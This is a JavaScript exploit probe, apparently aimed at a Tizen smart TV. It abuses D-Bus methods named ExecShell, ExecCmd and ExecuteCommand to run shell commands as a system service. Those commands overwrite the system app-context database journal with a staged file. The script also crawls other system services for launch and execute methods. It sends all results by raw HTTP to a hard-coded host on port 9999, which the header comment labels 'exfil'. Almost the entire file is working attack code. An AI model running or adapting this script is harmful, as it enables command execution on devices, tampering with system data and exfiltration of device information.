"use strict";

/* p66: RAS marker test + WAS/appctxmgr deep introspect
   A. RAS: 3 methods x unique marker files (whoami/id/cp/md5/ls/date)
   B. read markers immediately
   C. deep introspect (BFS depth<=4): webappservice.server, litewebappservice.server, appctxmgr
   D. wait 60s
   E. read markers again + verify DST/LIVE md5 + full ListNames
   exfil /p66info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var MARKDIR = '/home/owner/share/tmp/sdk_tools';
var RAS = 'com.native.RunningAppsServiceDBUS';
var RAS_PATH = '/com/native/RunningAppsServiceDBUS';
var R = { ts: new Date().toISOString(), probe: 'p66', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p66info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function parseDbusXml(text) {
  var ifaces = {};
  var ire = /<interface name=['"]([^'"]+)['"]>/g;
  var mi;
  while ((mi = ire.exec(String(text))) !== null) {
    var ifname = mi[1];
    if (!ifaces[ifname]) ifaces[ifname] = [];
    var body = String(text).substring(mi.index);
    var end = body.indexOf('</interface>');
    if (end > 0) body = body.substring(0, end);
    var mre = /<method name=['"]([^'"]+)['"]>([\s\S]*?)<\/method>/g;
    var mm;
    while ((mm = mre.exec(body)) !== null) {
      var args = [];
      var are = /<arg[^>]*type=['"]([^'"]+)['"][^>]*>/g;
      var am;
      while ((am = are.exec(mm[2])) !== null) args.push(am[1]);
      ifaces[ifname].push({ name: mm[1], args: args });
    }
  }
  return ifaces;
}

function parseNodes(text) {
  var nodes = [];
  var re = /node name=['"]([^'"]+)['"]/g;
  var m;
  while ((m = re.exec(String(text))) !== null) {
    if (nodes.indexOf(m[1]) < 0) nodes.push(m[1]);
  }
  return nodes;
}

/* BFS introspection; collect method names matching a regex */
function deepScan(name, rootPath, maxDepth, wantedRe) {
  var found = [];
  var visited = {};
  var queue = [{ path: rootPath, depth: 0 }];
  var calls = 0;
  while (queue.length > 0 && calls < 40) {
    var item = queue.shift();
    calls++;
    var p = item.path;
    if (visited[p]) continue;
    visited[p] = true;
    var out = run('dbus-send --system --print-reply --dest=' + name + ' ' + p + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -120', 30000, 6000);
    if (out.indexOf('Error') >= 0) continue;
    var ifs = parseDbusXml(out);
    var ifkeys = Object.keys(ifs);
    for (var i = 0; i < ifkeys.length; i++) {
      var ms = ifs[ifkeys[i]];
      for (var j = 0; j < ms.length; j++) {
        if (wantedRe.test(ms[j].name)) {
          found.push(p + ' ' + ifkeys[i] + '.' + ms[j].name + ' args=' + JSON.stringify(ms[j].args));
        }
      }
    }
    var nodes = parseNodes(out);
    for (var n = 0; n < nodes.length; n++) {
      var child = p === '/' ? '/' + nodes[n] : p + '/' + nodes[n];
      if (!visited[child]) queue.push({ path: child, depth: item.depth + 1 });
    }
  }
  return { found: found, calls: calls, paths: Object.keys(visited) };
}

function main() {
  /* ---------- A. RAS marker calls ---------- */
  var methods = ['ExecShell', 'ExecCmd', 'ExecuteCommand'];
  for (var m = 0; m < methods.length; m++) {
    var mk = MARKDIR + '/ras_m' + (m + 1) + '.txt';
    var inner = 'date > ' + mk + ' 2>&1; whoami >> ' + mk + ' 2>&1; id >> ' + mk + ' 2>&1; ' +
      'cp ' + STAGED + ' ' + DST + ' >> ' + mk + ' 2>&1; ' +
      'md5sum ' + DST + ' >> ' + mk + ' 2>&1; ' +
      'ls -la ' + DST + ' >> ' + mk + ' 2>&1; echo END >> ' + mk;
    var dbusArg = 'string:"sh -c ' + "'" + inner + "'" + '"';
    R.results['a_' + methods[m]] = run('dbus-send --system --print-reply --dest=' + RAS + ' --type=method_call ' + RAS_PATH + ' com.native.RunningApps_DBUS.' + methods[m] + ' ' + dbusArg + ' 2>&1 | head -12', 40000);
  }

  /* ---------- B. markers immediately ---------- */
  R.results.b_markers = run('for f in ' + MARKDIR + '/ras_m1.txt ' + MARKDIR + '/ras_m2.txt ' + MARKDIR + '/ras_m3.txt; do echo "=== $f"; ls -la "$f" 2>&1; cat "$f" 2>&1; done', 15000);

  /* ---------- C. deep scans ---------- */
  R.results.c1_webapp = JSON.stringify(deepScan('org.tizen.tv.webappservice.server', '/', 4, /launch|activate|execute|start/i));
  R.results.c2_lite = JSON.stringify(deepScan('org.tizen.tv.litewebappservice.server', '/', 4, /launch|activate|execute|start/i));
  R.results.c3_appctx = JSON.stringify(deepScan('org.tizen.tv.appfw.appctxmgr', '/', 3, /.*/));

  /* ---------- D. wait ---------- */
  try { cp.execSync('sleep 60', { timeout: 80000, maxBuffer: 4096 }); } catch (e) {}

  /* ---------- E. markers again + verify ---------- */
  R.results.e1_markers = run('for f in ' + MARKDIR + '/ras_m1.txt ' + MARKDIR + '/ras_m2.txt ' + MARKDIR + '/ras_m3.txt; do echo "=== $f"; ls -la "$f" 2>&1; cat "$f" 2>&1; done', 15000);
  R.results.e2_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1', 20000);
  R.results.e3_listnames_full = run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1', 45000, 60000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
